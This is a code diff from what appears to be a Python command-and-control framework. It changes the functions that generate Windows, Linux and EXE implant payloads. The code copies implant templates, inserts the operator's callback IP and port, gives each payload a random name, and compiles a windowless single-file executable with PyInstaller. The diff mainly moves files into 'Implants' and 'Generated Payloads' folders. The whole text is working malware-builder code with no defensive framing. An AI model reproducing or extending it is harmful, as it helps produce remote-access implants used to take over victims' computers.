@@ -209,60 +209,60 @@ def comm_handler():
 def winplant():
     ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
     file_name = f'{ran_name}.py'
-    check_cwd = os.getcwd()
+    generated = f'Generated Payloads\\{file_name}'
 
-    if os.path.exists(f'{check_cwd}\\winplant.py'):
-        shutil.copy('winplant.py', file_name)
+    if os.path.exists(r'Implants\winplant.py'):
+        shutil.copy('Implants\\winplant.py', generated)
     else:
         error("File Not Found - winplant.py")
 
     # Write IP to file
-    with open(file_name) as f:
+    with open(generated) as f:
         new_host = f.read().replace('INPUT_IP_HERE', host_ip)
 
-    with open(file_name, 'w') as f:
+    with open(generated, 'w') as f:
         f.write(new_host)
         f.close()
 
     # Write Port to file
-    with open(file_name) as f:
+    with open(generated) as f:
         new_port = f.read().replace('INPUT_PORT_HERE', host_port)
 
-    with open(file_name, 'w') as f:
+    with open(generated, 'w') as f:
         f.write(new_port)
         f.close()
 
-    success(f'Payload {file_name} Created at {check_cwd}')
+    success(f'Payload {file_name} Created at {generated}')
 
 
 # Linux Payloads
 def linplant():
     ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
     file_name = f'{ran_name}.py'
-    check_cwd = os.getcwd()
+    generated = f'Generated Payloads\\{file_name}'
 
-    if os.path.exists(f'{check_cwd}\\linplant.py'):
-        shutil.copy('linplant.py', file_name)
+    if os.path.exists(f'Implants\\linplant.py'):
+        shutil.copy('Implants/linplant.py', generated)
     else:
         error("File Not Found - linplant.py")
 
     # Write IP to file
-    with open(file_name) as f:
+    with open(generated) as f:
         new_host = f.read().replace('INPUT_IP_HERE', host_ip)
 
-    with open(file_name, 'w') as f:
+    with open(generated, 'w') as f:
         f.write(new_host)
         f.close()
 
     # Write Port to file
-    with open(file_name) as f:
+    with open(generated) as f:
         new_port = f.read().replace('INPUT_PORT_HERE', host_port)
 
-    with open(file_name, 'w') as f:
+    with open(generated, 'w') as f:
         f.write(new_port)
         f.close()
 
-    success(f'[+] Payload {file_name} Created at {check_cwd}')
+    success(f'Payload {file_name} Created at {generated}')
 
 
 # EXE Payloads
@@ -270,41 +270,46 @@ def exeplant():
     ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
     file_name = f'{ran_name}.py'
     exe_file = f'{ran_name}.exe'
-    check_cwd = os.getcwd()
+    generated = f'Generated Payloads\\{file_name}'
 
-    if os.path.exists(f'{check_cwd}\\winplant.py'):
-        shutil.copy('winplant.py', file_name)
+    if os.path.exists(f'Implants\\winplant.py'):
+        shutil.copy('Implants\\winplant.py', generated)
     else:
         error("File Not Found - winplant.py")
 
     # Write IP to file
-    with open(file_name, ) as f:
+    with open(generated) as f:
         new_host = f.read().replace('INPUT_IP_HERE', host_ip)
-    with open(file_name, 'w') as f:
+
+    with open(generated, 'w') as f:
         f.write(new_host)
         f.close()
+
     # Write Port to file
-    with open(file_name) as f:
+    with open(generated) as f:
         new_port = f.read().replace('INPUT_PORT_HERE', host_port)
-    with open(file_name, 'w') as f:
+
+    with open(generated, 'w') as f:
         f.write(new_port)
         f.close()
 
+    success(f'Payload {file_name} Created at {generated}')
+
     # Verbose File Path
-    if os.path.exists(f'{file_name}'):
-        success(f"{file_name} saved to {check_cwd}")
+    if os.path.exists(generated):
+        success(f"{file_name} saved to {generated}")
     else:
         error(f"Error occurred during payload generation")
 
     # PyInstaller Command Handling
-    pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
-    print(Fore.BLUE + f"[i] Generating Executable {exe_file}..." + Style.RESET_ALL)
+    pyinstaller_exec = f'pyinstaller "Generated Payloads\\{file_name}" -w --clean --onefile --distpath .'
+    info(f"Generating Executable {exe_file}...")
     subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL)
     os.remove(f'{ran_name}.spec')
-
     shutil.rmtree('build')
-    if os.path.exists(f'{check_cwd}\\{exe_file}'):
-        success(f"Executable Generated to Current Directory: {exe_file}")
+    os.replace(f'{exe_file}', f'Generated Payloads\\{exe_file}')
+    if os.path.exists(f'Generated Payloads\\{ran_name}.exe'):
+        success(f"Executable Generated to Generated Payloads Directory: {exe_file}")
 
     else:
         error(f"Executable Generation Failed")
